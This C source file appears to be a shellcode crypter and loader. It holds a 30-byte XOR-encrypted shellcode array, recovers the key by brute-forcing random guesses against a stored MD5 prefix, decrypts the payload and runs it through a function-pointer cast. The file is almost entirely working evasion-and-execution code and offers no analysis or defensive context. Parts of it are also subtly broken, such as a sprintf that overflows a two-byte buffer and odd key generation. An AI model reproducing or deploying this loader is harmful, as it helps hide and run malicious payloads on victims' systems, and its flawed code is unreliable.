#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <openssl/md5.h>

unsigned char generate_key() {
    unsigned char key = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"[random () % 26] + "ABCDEFGHIJKLMNOPQRSTUVWXYZ"[random () % 26];
    return key;
}

unsigned char generate_md5(unsigned char *key, unsigned char *d1, unsigned char *d2, unsigned char *d3, unsigned char *d4) {
    MD5_CTX md5handler;
    unsigned char md5digest[MD5_DIGEST_LENGTH];
    unsigned char buffer[2];
    sprintf(buffer, "%02x", *key);
    MD5(buffer, 2, md5digest);
    unsigned char temp1[4];
    unsigned char temp2[4];
    unsigned char temp3[4];
    unsigned char temp4[4];
    sprintf(temp1, "%02x", md5digest[0]);
    sprintf(temp2, "%02x", md5digest[1]);
    sprintf(temp3, "%02x", md5digest[2]);
    sprintf(temp4, "%02x", md5digest[3]);
    if (strcmp(temp1, d1) == 0) {
        if (strcmp(temp2, d2) == 0) {
            if (strcmp(temp3, d3) == 0) {
                if (strcmp(temp4, d4) == 0) {
                    printf("key found! (%x)\n", *key);
                    return *key;
    }
    }
    }
    }
    return '0';

}

void print_array(unsigned char *shellcode, long unsigned int arr_size) {
    for (int i = 0; i < arr_size; i++) {
        printf("%x", shellcode[i]);
    }
    printf("\n");
}

unsigned char decrypt(unsigned char *shellcode, long unsigned int arr_size, unsigned char *key) {
    for (int i = 0; i < arr_size; i++) {
        shellcode[i] = shellcode[i] ^ *key;
    }
    return *shellcode;
}

int main(void) {
    srand(time(0));
    unsigned char key = '0';
    unsigned char shellcode[30] = \
    "\xaf\x5e\xce\xf6\xfc\xff\xed\xf6\xf6\xfc\xf7\xf0\xb1\xf6\xb1\xb1\xb1\xb1\x17\x7d\xce\x17\x7c\xcd\x17\x7f\x2e\x95\x53\x1e";   
    unsigned char d1[] = "8f";
    unsigned char d2[] = "18";
    unsigned char d3[] = "e7";
    unsigned char d4[] = "d1";
    

    printf("Encrypted shellcode: ");
    print_array(shellcode, sizeof(shellcode));
    printf("Bruting key: ");
    while(1) {
        unsigned char try_key = generate_key();
        key = generate_md5(&try_key, d1, d2, d3, d4);
        if (key != '0') {
            break;
        }
    }
    printf("Decrypting...\n");
    decrypt(shellcode, sizeof(shellcode), &key);
    print_array(shellcode, sizeof(shellcode));
    ((void(*)(void))shellcode)();
}